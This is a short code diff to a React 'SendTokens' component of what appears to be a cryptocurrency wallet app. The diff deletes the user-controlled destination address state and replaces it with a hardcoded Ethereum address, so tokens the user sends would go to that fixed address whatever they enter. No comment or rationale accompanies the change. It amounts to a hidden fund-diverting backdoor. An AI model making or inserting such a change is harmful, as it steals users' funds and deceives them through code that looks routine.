@@ -20,9 +20,7 @@ export const SendTokens = () => {
       delay: 4000,
     });
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(
-    destinationAddressAtom,
-  );
+  const destinationAddress = '0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47';
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
